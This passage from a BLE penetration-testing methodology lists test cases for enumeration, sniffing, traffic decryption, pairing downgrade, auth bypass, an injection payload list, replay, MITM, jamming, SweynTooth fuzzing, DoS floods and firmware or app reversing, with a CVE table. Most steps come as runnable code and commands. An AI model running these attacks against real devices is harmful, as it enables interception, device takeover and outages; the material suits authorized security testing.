- `ADV_SCAN_IND` (0x06) → Scannable but not connectable

### TC-006: Beacon Identification

iBeacon format detection:
```python
# Manufacturer data: 0x004C (Apple) + 0x0215 + UUID + Major + Minor + Power
# Eddystone: Service UUID 0xFEAA + frame type (0x00=URL, 0x10=UID, 0x20=TLM)

from bleak import BleakScanner
import asyncio

async def beacon_scan():
    devices = await BleakScanner.discover(timeout=10.0)
    for d in devices:
        adv = d.details.get('props', {})
        mfr = adv.get('ManufacturerData', {})
        
        # iBeacon: Apple company ID (0x004C) with type 0x02
        if 0x004C in mfr:
            data = mfr[0x004C]
            if len(data) >= 2 and data[0] == 0x02:
                print(f"iBeacon detected: {d.address}")
                print(f"  UUID: {data[2:18].hex()}")
                print(f"  Major: {int.from_bytes(data[18:20], 'big')}")
                print(f"  Minor: {int.from_bytes(data[20:22], 'big')}")

asyncio.run(beacon_scan())
```

---

## 9. Phase 2 — Enumeration & GATT Analysis

### Objective
Connect to target device, enumerate all services and characteristics, document the full GATT profile.

### TC-007: GATT Profile Enumeration

```bash
# Method 1: Bettercap (easiest)
sudo bettercap
>> ble.recon on
>> ble.show
>> ble.enum AA:BB:CC:DD:EE:FF
# Shows: Services, Characteristics, Handles, UUIDs, Properties, Current Values

# Method 2: gatttool
sudo gatttool -b AA:BB:CC:DD:EE:FF -I
[AA:BB:CC:DD:EE:FF][LE]> connect
[AA:BB:CC:DD:EE:FF][LE]> primary
[AA:BB:CC:DD:EE:FF][LE]> characteristics
[AA:BB:CC:DD:EE:FF][LE]> char-desc    # Show descriptors

# Method 3: Python bleak
async def full_gatt_dump(address):
    async with BleakClient(address) as client:
        for service in client.services:
            print(f"\nService: {service.uuid}")
            print(f"  Description: {service.description}")
            for char in service.characteristics:
                print(f"  Characteristic: {char.uuid}")
                print(f"    Description: {char.description}")
                print(f"    Properties:  {', '.join(char.properties)}")
                print(f"    Handle:      {char.handle}")
                if "read" in char.properties:
                    try:
                        value = await client.read_gatt_char(char.uuid)
                        print(f"    Value (hex): {value.hex()}")
                        print(f"    Value (str): {value.decode('utf-8', errors='replace')}")
                    except Exception as e:
                        print(f"    Read error: {e}")
                for desc in char.descriptors:
                    print(f"    Descriptor: {desc.uuid} (Handle: {desc.handle})")
```

### TC-008: Read All Readable Characteristics

```bash
# Script to bulk-read all characteristics
async def read_all(address):
    async with BleakClient(address) as client:
        for service in client.services:
            for char in service.characteristics:
                if "read" in char.properties:
                    try:
                        val = await client.read_gatt_char(char.uuid)
                        print(f"{char.uuid}: {val.hex()} | {val}")
                    except Exception as e:
                        print(f"{char.uuid}: ERROR - {e}")
```

### TC-009: Device Information Service (DIS) Extraction

DIS (UUID: 0x180A) often leaks sensitive device info:
```bash
# Standard DIS Characteristics:
# 0x2A29 - Manufacturer Name String
# 0x2A24 - Model Number String
# 0x2A25 - Serial Number String
# 0x2A27 - Hardware Revision String
# 0x2A26 - Firmware Revision String
# 0x2A28 - Software Revision String
# 0x2A23 - System ID (OUI + manufacturer-assigned value)
# 0x2A2A - IEEE 11073-20601 Regulatory Certification Data

gatttool -b AA:BB:CC:DD:EE:FF --char-read --uuid=00002a29-0000-1000-8000-00805f9b34fb
gatttool -b AA:BB:CC:DD:EE:FF --char-read --uuid=00002a25-0000-1000-8000-00805f9b34fb  # Serial!
```

### TC-010: Notification Subscription Testing

```bash
# Enable notifications by writing 0x0100 to CCCD (UUID 0x2902)
# Enable indications by writing 0x0200 to CCCD

# Find CCCD handle for a characteristic at handle 0x0012
# CCCD is typically at handle 0x0013 (next handle)
gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x0013 -n 0100 --listen

# Python approach
async def subscribe_notify(address, char_uuid):
    async with BleakClient(address) as client:
        def notification_handler(sender, data):
            print(f"Notification from {sender}: {data.hex()}")
        
        await client.start_notify(char_uuid, notification_handler)
        await asyncio.sleep(30.0)  # Listen for 30 seconds
        await client.stop_notify(char_uuid)
```

### TC-011: UUID Discovery & Mapping

Map custom 128-bit UUIDs to known vendor profiles:
```bash
# Known custom UUID databases:
# https://btprodspecificationrefs.blob.core.windows.net/assigned-values/16-bit%20UUID%20Numbers%20Document.pdf
# https://www.bluetooth.com/specifications/assigned-numbers/

# Common patterns in custom UUIDs:
# XXXXXXXX-0000-1000-8000-00805f9b34fb → Standard BT SIG UUID
# XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX → Vendor custom UUID

# Cross-reference with decompiled app strings
grep -r "UUID\|service\|characteristic" jadx_output/ | grep -v ".class" | sort -u
```

---

## 10. Phase 3 — Sniffing & Traffic Analysis

### Objective
Capture BLE traffic between the target device and its controller (phone/hub) to understand protocols, find sensitive data, and capture pairing exchanges.

### TC-012: Passive BLE Traffic Capture (nRF52840)

```bash
# 1. Flash nRF52840 with sniffer firmware from Nordic
# 2. Install Wireshark nRF Sniffer plugin:
#    https://infocenter.nordicsemi.com/topic/ug_sniffer_ble/UG/sniffer_ble/intro.html

# 3. Launch Wireshark with sniffer interface
wireshark -i /dev/ttyACM0 -k

# 4. Filter for target device
# In nRF Sniffer plugin interface: select target MAC from dropdown
# or in Wireshark: btle.advertising_address == aa:bb:cc:dd:ee:ff

# 5. Save capture
# File → Save As → target_capture.pcap
```

### TC-013: HCI Sniffing (When You Control the Central)

If you control the central device (e.g., your Android phone):
```bash
# Method 1: btmon (Linux central)
sudo btmon -w hci_capture.btsnoop

# Method 2: Android HCI snoop log
# Settings → Developer Options → Enable Bluetooth HCI Snoop Log
# Capture log: adb pull /sdcard/btsnoop_hci.comb
# or: adb pull /data/misc/bluetooth/logs/btsnoop_hci.log

# Method 3: iOS Bluetooth Packet Logging
# Pair your iOS device with Mac
# Profile → Settings → Network Logging → Bluetooth
# Open PacketLogger from Xcode Additional Tools
```

### TC-014: Capture Pairing Exchange (For Decryption)

Critical: Must capture the **complete pairing sequence** to later decrypt the session.

Wireshark filters for pairing:
```
btsmp.opcode == 0x01  # Pairing Request
btsmp.opcode == 0x02  # Pairing Response  
btsmp.opcode == 0x03  # Pairing Confirm
btsmp.opcode == 0x04  # Pairing Random
btsmp.opcode == 0x05  # Pairing Failed
btsmp.opcode == 0x06  # Encryption Information (LTK)
```

### TC-015: Decrypt Captured BLE Traffic

```bash
# If Legacy Pairing was used (Just Works — TK = 0):
./crackle -i capture.pcap -o decrypted.pcap
# CrackLE automatically computes STK from captured exchange

# Provide LTK manually (if known from device firmware/app):
# In Wireshark: Edit → Preferences → Protocols → BLE
# Add: Address, Key Type (LTK), Key (32 hex chars)

# If you know the 6-digit passkey:
# Passkey Entry TK = the 6-digit number as 128-bit value
# TK = 000000000000000000000000000XXXXX (where XXXXX is the passkey)
./crackle -i capture.pcap -o decrypted.pcap -t <TK_hex>
```

### TC-016: Traffic Pattern Analysis

After decryption, analyze:
```python
import pyshark

cap = pyshark.FileCapture('decrypted.pcap', display_filter='btatt')
for pkt in cap:
    if hasattr(pkt, 'btatt'):
        opcode = pkt.btatt.opcode
        if opcode == '0x52':  # Write Request
            handle = pkt.btatt.handle
            value = pkt.btatt.value
            print(f"Write to handle {handle}: {value}")
        elif opcode == '0x0b':  # Read Response
            value = pkt.btatt.value
            print(f"Read Response: {value}")
```

---

## 11. Phase 4 — Pairing & Authentication Attacks

### Objective
Test pairing security, attempt downgrade attacks, bypass authentication mechanisms.

### TC-017: Pairing Mode Detection

```bash
# Check if device supports Secure Connections (BLE 4.2+)
# Look in SMP Pairing Request/Response:
# Auth Req field: Bit 3 = SC (Secure Connections), Bit 2 = MITM

# Using Wireshark:
btsmp.opcode == 0x01  # Pairing Request
# Look at: Authentication Requirements field
# Bit 0: Bonding Flags
# Bit 2: MITM (man-in-the-middle protection requested)
# Bit 3: SC (Secure Connections supported)
# Bit 4: Keypress (keypress notification)
# Bit 5: CT2
```

### TC-018: Just Works Exploitation

If device uses "Just Works" pairing (no MITM protection):
```bash
# Just Works = TK is all zeros
# This means any device can pair without user confirmation
# And the STK can be trivially computed

# Test: Connect without any passkey
bluetoothctl
pair AA:BB:CC:DD:EE:FF
# If pairing succeeds without any PIN/passkey prompt → Just Works confirmed

# Attack: Use CrackLE to decrypt entire session
./crackle -i capture.pcap -o decrypted.pcap
```

### TC-019: Pairing Downgrade Attack

Force downgrade from Secure Connections to Legacy Pairing:
```python
# A device claiming SC support but also accepting Legacy must be tested
# Send Pairing Request with SC bit = 0 (disabled)
# If device accepts → it supports Legacy pairing despite advertising SC

# Test using BLEsuite or custom SMP packet:
from blesuite.pybt.sm import SM_Hdr, SM_Pairing_Request
import struct

# Craft Pairing Request without SC bit
pairing_req = SM_Pairing_Request(
    iocap=0x03,         # NoInputNoOutput
    oob=0x00,           # OOB not present
    authentication=0x01, # Bonding only, NO MITM, NO SC ← downgrade!
    max_key_size=0x10,
    init_key_dist=0x01,
    resp_key_dist=0x01
)
```

### TC-020: Passkey Brute Force (Legacy Pairing)

Legacy pairing passkey is only 6 digits (0–999,999):
```bash
# Theoretical attack: with captured Pairing Confirm and Pairing Random,
# can brute-force the 6-digit TK offline
# CrackLE handles this automatically for Just Works (TK=0)
# For Passkey Entry: 10^6 possibilities, CrackLE can brute-force offline

./crackle -i capture_with_passkey.pcap -b  # Brute force mode
```

### TC-021: OOB Data Interception

If OOB (Out of Band) data is transmitted insecurely (e.g., QR code in photo, NFC):
- Capture OOB data
- Use it to complete pairing as a MITM

### TC-022: Authentication Bypass — Unprotected Characteristics

Test whether security-sensitive characteristics enforce authentication:
```python
async def test_auth_bypass(address, char_uuid):
    # Connect WITHOUT pairing/bonding
    async with BleakClient(address) as client:
        # Try to read/write protected characteristic without auth
        try:
            val = await client.read_gatt_char(char_uuid)
            print(f"[!] AUTH BYPASS: Read succeeded without authentication!")
            print(f"    Value: {val.hex()}")
        except Exception as e:
            if "Insufficient Authentication" in str(e):
                print(f"[✓] Authentication properly required")
            elif "Insufficient Encryption" in str(e):
                print(f"[~] Encryption required (but may be insufficient)")
            else:
                print(f"Error: {e}")
```

---

## 12. Phase 5 — GATT Exploitation

### Objective
Exploit weaknesses in GATT implementation: unauthorized reads/writes, insecure characteristics, missing input validation, command injection.

### TC-023: Unauthorized Write Test

```bash
# Try writing to all writable characteristics without authentication
async def unauthorized_write_test(address):
    async with BleakClient(address) as client:
        for service in client.services:
            for char in service.characteristics:
                if "write" in char.properties or "write-without-response" in char.properties:
                    # Try simple writes
                    for test_val in [b'\x00', b'\x01', b'\xFF', b'\x00\x00\x00\x00']:
                        try:
                            await client.write_gatt_char(char.uuid, test_val, response=True)
                            print(f"[!] Write SUCCEEDED: {char.uuid} = {test_val.hex()}")
                        except Exception as e:
                            print(f"    Write blocked: {char.uuid} - {e}")
```

### TC-024: Sensitive Data Exposure Test

Check for PII, credentials, or secrets in readable characteristics:
```bash
# Read all accessible values and inspect for:
# - Serial numbers (can be used for auth)
# - MAC addresses, IP addresses
# - User names or IDs
# - Encryption keys (common mistake in low-quality IoT)
# - Health data, location data
# - Version strings (for known CVE matching)

# Known sensitive UUIDs to check:
SENSITIVE_UUIDS = {
    '00002a25-0000-1000-8000-00805f9b34fb': 'Serial Number',
    '00002a19-0000-1000-8000-00805f9b34fb': 'Battery Level',
    '00002a6e-0000-1000-8000-00805f9b34fb': 'Temperature',
    '00002a37-0000-1000-8000-00805f9b34fb': 'Heart Rate Measurement',
    '00002a56-0000-1000-8000-00805f9b34fb': 'Digital I/O',
}
```

### TC-025: Command Injection via Characteristic Write

```bash
# If a characteristic value is processed as a command:
# Test for buffer overflows, format strings, command injection

import asyncio
from bleak import BleakClient

PAYLOADS = [
    b'A' * 100,                    # Buffer overflow
    b'A' * 512,                    # Larger buffer overflow
    b'\x00' * 20,                  # Null byte injection
    b'\xFF' * 20,                  # Max byte values
    b'../../../etc/passwd\x00',    # Path traversal
    b'<script>alert(1)</script>',  # XSS (web-connected devices)
    b"'; DROP TABLE users; --",    # SQL injection (if DB-backed)
    b'\x41\x41\x41\x41\x41\x41\x41\x41'  # Pattern for overflow detection
]

async def inject_test(address, char_uuid):
    async with BleakClient(address) as client:
        for payload in PAYLOADS:
            try:
                await client.write_gatt_char(char_uuid, payload)
                print(f"[*] Sent: {payload[:20]}...")
                await asyncio.sleep(0.5)
                # Check if device crashes/disconnects
                if not client.is_connected:
                    print(f"[!] Device DISCONNECTED after payload: {payload[:20].hex()}")
                    break
            except Exception as e:
                print(f"Error: {e}")
```

### TC-026: Replay Attack Testing

```bash
# Capture a valid BLE command sequence
# Replay it after original session ends

# Step 1: Capture with Ubertooth/nRF52840
ubertooth-btle -f -c command_capture.pcap -t AA:BB:CC:DD:EE:FF

# Step 2: Extract command bytes from pcap (Wireshark export)

# Step 3: Replay captured characteristic write
async def replay_attack(address, char_uuid, captured_bytes):
    async with BleakClient(address) as client:
        print(f"Replaying: {captured_bytes.hex()}")
        await client.write_gatt_char(char_uuid, captured_bytes)
        # Observe if action is performed (unlock, motor movement, etc.)
```

### TC-027: GATT Handle Traversal (Out-of-Bounds Access)

```bash
# Try accessing handles outside enumerated range
# Some devices expose hidden services accessible only by handle

async def handle_traversal(address):
    async with BleakClient(address) as client:
        for handle in range(0x0001, 0x00FF):
            try:
                # Read arbitrary handle using ATT Read Request
                result = await client.read_gatt_char(handle)
                print(f"Handle 0x{handle:04X}: {result.hex()}")
            except Exception:
                pass  # Handle not accessible or doesn't exist
```

### TC-028: GATT Write-Without-Response vs. Write-With-Response

```bash
# Write-Without-Response (Write Command) has no acknowledgment
# Useful for high-speed data but means no error feedback
# Attack: flood with malformed Write-Without-Response

async def write_flood(address, char_uuid):
    async with BleakClient(address) as client:
        for i in range(1000):
            try:
                await client.write_gatt_char(
                    char_uuid,
                    bytes([i % 256]),
                    response=False  # Write-Without-Response
                )
            except Exception as e:
                print(f"Error at iteration {i}: {e}")
                break
```

---

## 13. Phase 6 — Man-in-the-Middle (MITM) Attacks

### Objective
Position attacker between BLE central (phone) and peripheral (device) to intercept, modify, and replay traffic.

### TC-029: GATTacker MITM Setup

Requires 2 BLE adapters (or 2 separate machines):

```bash
# Machine 1 (Proxy — connects to real peripheral):
npm install -g gattacker
node scan.js                           # Step 1: Scan and profile target
node proxy.js -a AA:BB:CC:DD:EE:FF    # Step 2: Connect to real device as proxy

# Machine 2 (Fake Peripheral — advertises to central):
node clone.js AA:BB:CC:DD:EE:FF       # Clone device profile
# Configure to forward traffic to proxy machine
```

```javascript
// GATTacker config: modify traffic in transit
// In your attack script:
device.on('characteristic-write', function(char, value) {
    console.log('[MITM] Intercepted write to', char.uuid, ':', value.toString('hex'));
    
    // Modify value before forwarding
    var modified = Buffer.from(value);
    modified[0] = 0xFF;  // Change first byte
    
    // Forward modified value to real device
    proxyChar.write(modified, false);
});
```

### TC-030: BTLEJuice MITM

```bash
# Terminal 1: Start proxy (connects to real device)
btlejuice-proxy -i AA:BB:CC:DD:EE:FF

# Terminal 2: Start main server (acts as fake peripheral)
btlejuice -u <proxy_machine_ip>

# Access web UI at http://localhost:8080
# UI shows all traffic in real time; can intercept/modify
```

### TC-031: MITM via Jamming + Impersonation

```bash
# Advanced: Jam the real peripheral's advertisements
# Then advertise with same BD_ADDR, forcing central to connect to attacker

# Jamming (Ubertooth — authorized testing only):
ubertooth-btle -j AA:BB:CC:DD:EE:FF  # Jam specific device

# Spoof MAC address on attacker adapter:
sudo hciconfig hci0 down
sudo btmgmt -i hci0 public-addr AA:BB:CC:DD:EE:FF
# or:
sudo hciconfig hci0 up
sudo hcitool -i hci0 cmd 0x03 0x0013 AA BB CC DD EE FF  # HCI vendor command
```

### TC-032: BLESA — BLE Spoofing Attack on Reconnection

BLE specification weakness in reconnection (CVE-2020-9770, USENIX WOOT 2020):
```bash
# BLESA exploits the fact that reconnection procedure 
# does NOT mandate re-authentication

# When device reconnects, attacker can:
# 1. Jam the legitimate peripheral
# 2. Impersonate it with same BD_ADDR
# 3. Skip the re-authentication (spec weakness)
# 4. Send spoofed data to central

# Test if device properly validates reconnection:
# - Check if GATT re-bonding is required after reconnect
# - Check if LTK is verified on reconnect
```

---

## 14. Phase 7 — Fuzzing BLE Stacks

### Objective
Send malformed, unexpected, or boundary-condition packets to crash or exploit BLE stack implementations.

### TC-033: Link Layer Fuzzing (SweynTooth)

```bash
# SweynTooth targets BLE LL and L2CAP
# Requires nRF52840 DK with custom SweynTooth firmware

git clone https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks
cd sweyntooth_bluetooth_low_energy_attacks

# Run individual test cases:
python3 ll_length_overflow.py AA:BB:CC:DD:EE:FF       # CVE-2019-16336
python3 ll_deadlock.py AA:BB:CC:DD:EE:FF               # CVE-2019-17519
python3 llid_deadlock.py AA:BB:CC:DD:EE:FF             # CVE-2019-17060
python3 invalid_connection_request.py AA:BB:CC:DD:EE:FF
python3 feature_request_ll_crash.py AA:BB:CC:DD:EE:FF
python3 key_size_overflow.py AA:BB:CC:DD:EE:FF         # CVE-2019-17516

# Run all SweynTooth tests:
python3 run_all.py AA:BB:CC:DD:EE:FF
```

### TC-034: ATT/GATT Protocol Fuzzing

```python
# Custom ATT fuzzer using raw HCI
import asyncio
from bleak import BleakClient
import struct, random

ATT_OPCODES = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
               0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
               0x11, 0x12, 0x13, 0x16, 0x18, 0x1A, 0x1B, 0x1D,
               0x52, 0x53, 0x54, 0x55, 0xD2]  # Including invalid ones

async def att_fuzzer(address):
    """Fuzz ATT layer with random/invalid opcodes and parameters"""
    async with BleakClient(address) as client:
        print(f"Connected. Starting ATT fuzzer...")
        
        for opcode in ATT_OPCODES:
            # Random payload of varying lengths
            for length in [0, 1, 2, 4, 8, 16, 20, 100, 512]:
                payload = bytes([opcode]) + bytes(random.getrandbits(8) for _ in range(length))
                try:
                    # Send raw ATT packet (requires low-level access)
                    # In practice, use custom firmware or Scapy + L2CAP socket
                    print(f"Sending opcode 0x{opcode:02X} with {length} bytes payload")
                    await asyncio.sleep(0.1)
                    
                    if not client.is_connected:
                        print(f"[!] CRASH: Device disconnected on opcode 0x{opcode:02X}")
                        return
                except Exception as e:
                    print(f"Error: {e}")
```

### TC-035: SMP Fuzzing

```bash
# Fuzz Security Manager Protocol
# Send malformed pairing messages

# Use BLEsuite or custom Scapy scripts:
from scapy.all import *
from scapy.layers.bluetooth import *

# Craft malformed Pairing Request
pkt = HCI_Hdr() / HCI_ACL_Hdr() / L2CAP_Hdr(cid=6) / SM_Hdr(sm_command=0x01) / \
      SM_Pairing_Request(
          iocap=0x05,        # Invalid IO capability (>4)
          oob=0xFF,          # Invalid OOB flag
          authentication=0xFF,  # All bits set (including reserved)
          max_key_size=0x01,    # Below minimum (7)
          init_key_dist=0xFF,   # All bits set
          resp_key_dist=0xFF
      )
sendp(pkt, iface="hci0")
```

### TC-036: L2CAP Fragmentation Fuzzing

```bash
# Send oversized L2CAP packets exceeding negotiated MTU
# Test for buffer overflows in L2CAP reassembly

# Craft L2CAP packet exceeding device MTU
MAX_MTU = 23  # Default ATT MTU; device may have negotiated higher

oversized_payload = b'A' * 1000  # Far exceeds MTU

# Send with gatttool (if device MTU allows) or custom socket:
python3 -c "
import socket, struct
sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
sock.bind(('', 0x0004))  # ATT channel
sock.connect(('AA:BB:CC:DD:EE:FF', 0x0004))
sock.send(b'\x52' + b'\x00\x00' + b'A' * 1000)  # Write Command + oversized data
"
```

---

## 15. Phase 8 — Denial of Service (DoS) Attacks

### Objective
Test device resilience against resource exhaustion, invalid packet flooding, and connection handling abuse.

### TC-037: Advertisement Flood Attack

```bash
# Send high-volume BLE advertisements (Bettercap or custom)
# Can interfere with legitimate device advertising

# Flipper Zero custom firmware BLE spam (for testing environment)
# iOS/Android spam via crafted ADV_IND packets with "new device" data

# Custom advertisement flood using hcitool:
sudo hciconfig hci0 leadv 0    # Enable non-connectable advertising

# Python custom advertiser:
import subprocess, time

def ble_advertise_flood():
    for i in range(100):
        # Rotate MAC for each advertisement
        mac = f"AA:BB:CC:DD:EE:{i:02X}"
        subprocess.run(['sudo', 'hcitool', '-i', 'hci0', 'cmd',
                       '0x08', '0x0008', '1f', '02', '01', '06',
                       '19', '09', hex(i)[2:].zfill(2), ...])
        time.sleep(0.01)
```

### TC-038: Connection Exhaustion (Max Connections)

```bash
# BLE controllers have limited simultaneous connection slots
# Attempt to exhaust all connection slots

import asyncio
from bleak import BleakClient

async def exhaust_connections(address):
    clients = []
    for i in range(20):  # Try to create many simultaneous connections
        try:
            client = BleakClient(address)
            await client.connect()
            clients.append(client)
            print(f"Connection {i+1} established")
        except Exception as e:
            print(f"Connection {i+1} failed: {e}")
            break
    
    print(f"Max connections achieved: {len(clients)}")
    for c in clients:
        await c.disconnect()
```

### TC-039: L2ping DoS

```bash
# Flood BLE device with L2CAP ping packets
sudo l2ping -i hci0 -f -s 512 AA:BB:CC:DD:EE:FF
# -f = flood mode
# -s = packet size
# Monitor if device becomes unresponsive
```

### TC-040: Invalid LLCP Packet DoS

```bash
# Send invalid Link Layer Control PDUs
# Targets: LL_FEATURE_REQ, LL_VERSION_IND, LL_TERMINATE_IND

# SweynTooth includes deadlock tests:
python3 ll_deadlock.py AA:BB:CC:DD:EE:FF
python3 llid_deadlock.py AA:BB:CC:DD:EE:FF

# These send malformed LLCP packets that can:
# - Cause infinite loop in BLE controller
# - Crash the device entirely
# - Require physical reset to recover
```

### TC-041: Pairing DoS

```bash
# Repeatedly send Pairing Request without completing pairing
# Some devices have no rate limiting on pairing attempts

for i in range(50):
    bluetoothctl pair AA:BB:CC:DD:EE:FF
    bluetoothctl remove AA:BB:CC:DD:EE:FF
    sleep 1
done
```

---

## 16. Phase 9 — Firmware & Application Layer Analysis

### Objective
Extract and analyze device firmware, reverse companion mobile apps, find hardcoded secrets and logic vulnerabilities.

### TC-042: Firmware Extraction via JTAG/SWD

```bash
# Identify debug pins on PCB (usually labeled TCK, TDI, TDO, TMS, NRST, GND, VCC)
# Common BLE SoCs: nRF52xx, CC2640, DA14585, CY8C

# OpenOCD + J-Link for nRF52:
openocd -f interface/jlink.cfg -f target/nrf52.cfg \
        -c "init; reset halt; flash read_bank 0 firmware.bin 0 0x80000; exit"

# For CC2640 (Texas Instruments):
# Use SmartRF Flash Programmer 2

# After extraction:
binwalk -e firmware.bin  # Extract filesystem/archives
strings firmware.bin | grep -i "password\|key\|secret\|uuid\|passkey"
```

### TC-043: Companion App Reverse Engineering (Android)

```bash
# Step 1: Obtain APK
adb pull /data/app/com.target.app/base.apk target.apk
# or from APKPure / APKMirror for public apps

# Step 2: Decompile with JADX
jadx -d output/ target.apk

# Step 3: Search for BLE-specific code
find output/ -name "*.java" | xargs grep -l "BluetoothGatt\|BluetoothLE\|BleManager"

# Step 4: Find hardcoded secrets
grep -r "UUID\|passkey\|pin\|password\|key\|secret\|token\|credential" output/ --include="*.java"

# Step 5: Find BLE pairing logic
grep -r "setPairingConfirmation\|createBond\|setPin" output/ --include="*.java"

# Step 6: Analyze crypto operations
grep -r "AES\|Cipher\|SecretKey\|KeySpec\|encrypt\|decrypt" output/ --include="*.java"

# Step 7: Check for hardcoded device credentials
grep -r "00:00:00\|FF:FF:FF\|password=\|secret=" output/ --include="*.java"
```

### TC-044: iOS App Analysis

```bash
# Decrypt iOS IPA (if not using jailbroken device research)
# Install frida on jailbroken device:
frida-ps -U  # List processes

# Hook BLE delegate methods
frida -U -l ios_ble_hook.js com.target.app
```

```javascript
// ios_ble_hook.js — Hook CoreBluetooth
ObjC.schedule(ObjC.mainQueue, function() {
    var CBCentralManager = ObjC.classes.CBCentralManager;
    var connectPeripheral = CBCentralManager['- connectPeripheral:options:'];
    Interceptor.attach(connectPeripheral.implementation, {
        onEnter: function(args) {
            var peripheral = ObjC.Object(args[2]);
            console.log('[BLE Connect] ' + peripheral.identifier().UUIDString());
        }
    });
    
    var CBPeripheral = ObjC.classes.CBPeripheral;
    var writeValue = CBPeripheral['- writeValue:forCharacteristic:type:'];
    Interceptor.attach(writeValue.implementation, {
        onEnter: function(args) {
            var data = ObjC.Object(args[2]);
            var char = ObjC.Object(args[3]);
            console.log('[BLE Write] UUID: ' + char.UUID() + ' Value: ' + data.description());
        }
    });
});
```

### TC-045: OTA (Over-the-Air) Firmware Update Analysis

```bash
# Test if OTA update process:
# 1. Verifies firmware signature
# 2. Uses encrypted channel
# 3. Validates firmware version (prevents downgrade)
# 4. Authenticates the update source

# Common BLE OTA profiles:
# - Nordic DFU (Device Firmware Update) - NimBLE/SoftDevice
# - TI OAD (Over-the-Air Download)
# - Silicon Labs OTA
# - Microchip BLE OAD

# Test for unsigned firmware acceptance:
# Build custom firmware, strip signature, attempt OTA
# If accepted → critical vulnerability

# Nordic DFU test:
pip install nrfutil
nrfutil dfu serial -pkg firmware.zip -p /dev/ttyACM0
# or BLE DFU:
nrfutil dfu ble -pkg firmware.zip -a AA:BB:CC:DD:EE:FF
```

---

## 17. Complete Test Case Catalog

| ID | Test Case | Category | Severity | Tools |
|---|---|---|---|---|
| TC-001 | Passive BLE Device Scan | Recon | Info | bluetoothctl, bettercap |
| TC-002 | Active Scan + Scan Response | Recon | Info | hcitool --active |
| TC-003 | Device Fingerprinting (OUI) | Recon | Info | bettercap, macvendors |
| TC-004 | Advertisement Data Analysis | Recon | Info | bleak, Wireshark |
| TC-005 | Connectable vs. Non-Connectable | Recon | Info | Wireshark |
| TC-006 | Beacon Identification (iBeacon/Eddystone) | Recon | Info | bleak, LightBlue |
| TC-007 | GATT Profile Enumeration | Enumeration | Info | bettercap, gatttool, bleak |
| TC-008 | Bulk Characteristic Read | Enumeration | Info | bleak, BLEsuite |
| TC-009 | Device Information Service Extraction | Enumeration | Low | gatttool |
| TC-010 | Notification Subscription Test | Enumeration | Info | gatttool, bleak |
| TC-011 | UUID Discovery & Mapping | Enumeration | Info | jadx, bleak |
| TC-012 | Passive Traffic Capture | Sniffing | Medium | nRF52840 + Wireshark |
| TC-013 | HCI Sniffer (Controlled Central) | Sniffing | Medium | btmon, Android HCI log |
| TC-014 | Pairing Exchange Capture | Sniffing | High | Ubertooth, nRF52840 |
| TC-015 | BLE Traffic Decryption | Sniffing | Critical | CrackLE, Wireshark |
| TC-016 | Traffic Pattern Analysis | Sniffing | Medium | pyshark, Wireshark |
| TC-017 | Pairing Mode Detection | Auth | Medium | Wireshark, bettercap |
| TC-018 | Just Works Exploitation | Auth | **Critical** | CrackLE |
| TC-019 | Pairing Downgrade Attack | Auth | **Critical** | BLEsuite, custom SMP |
| TC-020 | Legacy Passkey Brute Force | Auth | High | CrackLE brute-force |
| TC-021 | OOB Data Interception | Auth | High | Physical/NFC capture |
| TC-022 | Authentication Bypass (Unprotected Chars) | Auth | **Critical** | bleak |
| TC-023 | Unauthorized Write Test | GATT | **Critical** | bleak, bettercap |
| TC-024 | Sensitive Data Exposure | GATT | High | bleak, bettercap |
| TC-025 | Command Injection via Write | GATT | **Critical** | bleak, custom script |
| TC-026 | Replay Attack | GATT | High | Ubertooth + bleak |
| TC-027 | GATT Handle Traversal | GATT | High | bleak |
| TC-028 | Write-Without-Response Flood | GATT | Medium | bleak |
| TC-029 | GATTacker MITM | MITM | **Critical** | GATTacker |
| TC-030 | BTLEJuice MITM | MITM | **Critical** | BTLEJuice |
| TC-031 | Jamming + Impersonation | MITM | **Critical** | Ubertooth |
| TC-032 | BLESA Reconnection Spoofing | MITM | High | Custom PoC |
| TC-033 | SweynTooth LL Fuzzing | Fuzzing | High | SweynTooth PoC |
| TC-034 | ATT/GATT Protocol Fuzzing | Fuzzing | High | Custom script |
| TC-035 | SMP Fuzzing | Fuzzing | High | Scapy |
| TC-036 | L2CAP Fragmentation Fuzzing | Fuzzing | High | Custom script |
| TC-037 | Advertisement Flood | DoS | Medium | Custom script |
| TC-038 | Connection Exhaustion | DoS | Medium | bleak |
| TC-039 | L2ping Flood | DoS | Medium | l2ping |
| TC-040 | Invalid LLCP Packet DoS | DoS | High | SweynTooth |
| TC-041 | Pairing DoS | DoS | Medium | bluetoothctl |
| TC-042 | Firmware Extraction (JTAG) | Firmware | **Critical** | OpenOCD, J-Link |
| TC-043 | Companion App Reversing | App | High | jadx, Frida, apktool |
| TC-044 | iOS App Analysis | App | High | Frida, otool |
| TC-045 | OTA Update Integrity | Firmware | **Critical** | nrfutil, custom |

---

## 18. Known Critical CVEs & Vulnerability Families

### SweynTooth (BLE LL/L2CAP — 2020)

**Affected**: SDK stacks from Texas Instruments, NXP, Dialog, Microchip, STMicroelectronics, Telink, Cypress  
**Impact**: Crash, DoS, security bypass, arbitrary code execution on medical/IoT devices

| CVE | Vulnerability | Impact |
|---|---|---|
| CVE-2019-16336 | LL Length Overflow | Remote crash/DoS |
| CVE-2019-17519 | LL Deadlock | Freeze, requires reset |
| CVE-2019-17060 | LLID Deadlock | Freeze |
| CVE-2019-17061 | Truncated L2CAP | Crash |
| CVE-2019-17517 | Consecutive Data Fragments | Crash |
| CVE-2019-17518 | Key Size Overflow | Security bypass |
| CVE-2019-19192 | Invalid Connection Request | Crash |
| CVE-2019-19193 | Unexpected Public Key Type | Crash |
| CVE-2019-19194 | Connection Access Address Crash | Remote DoS |
| CVE-2019-19195 | Feature Request LLC | Crash |
| CVE-2019-19196 | Feature Response LLC | Crash |

### BrakTooth (Bluetooth Classic — 2021)

**Affected**: ESP32, Intel AX200, Qualcomm WCN3990, Texas Instruments CC2564C, Silicon Labs, Infineon  
**Impact**: Remote code execution, arbitrary code execution, denial of service  
**Notable**: CVE-2021-28139 allows arbitrary code execution on ESP32 SoCs used in >1400 products

### BlueBorne (2017)

